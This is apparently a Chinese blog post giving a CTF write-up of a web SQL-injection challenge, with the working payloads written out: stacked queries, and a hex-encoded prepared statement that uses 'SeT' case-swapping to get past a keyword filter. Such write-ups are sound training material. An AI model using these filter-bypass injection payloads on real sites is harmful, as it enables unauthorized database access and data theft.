---
layout: post
title: "BUUCTF 强网杯（WEB）随便注" 
subtitle: "BUUCTF 强网杯（WEB）随便注"
date: 2019-07-07
author: ppbibo
category: CTF
---

[TOC]

## BUUCTF 强网杯（WEB）随便注



## PS：

突然发现群里的大佬们都会玩CTF，而且CTF可以让你产生很多的骚思路，会磨去你的浮躁，别问我为什么；因此决定去学CTF。



## 0x1 堆叠注入

前期正常操作

```mysql
http://web16.buuoj.cn/?inject=1%27


-----回------显------
error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

```mysql
http://web16.buuoj.cn/?inject=1%27 order by 2#
```

```mysql
http://web16.buuoj.cn/?inject=1%27 union select 1,2#


-----回------显------
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

## 0x2 堆叠注入

```mysql
http://web16.buuoj.cn/?inject=1%27;show tables;#


# 发现 1919810931114514 和 words 两个表
```

```mysql
http://web16.buuoj.cn/?inject=1%27;set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#


-----回------显------
strstr($inject, "set") && strstr($inject, "prepare")
```

```bash
http://web16.buuoj.cn/?inject=1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#

# -----回------显------ 
# SeT 大小写绕过，预处理的方法执行sql语句

array(1) {
  [0]=>
  string(38) "flag{3fy145hzdo5ryeho9za94r0qnbkvha0g}"
}

```

![ctf_asfgsin_sql@2x](/static/img/ctf_asfgsin_sql@2x.png)



## 舒服了😌

参考：https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html

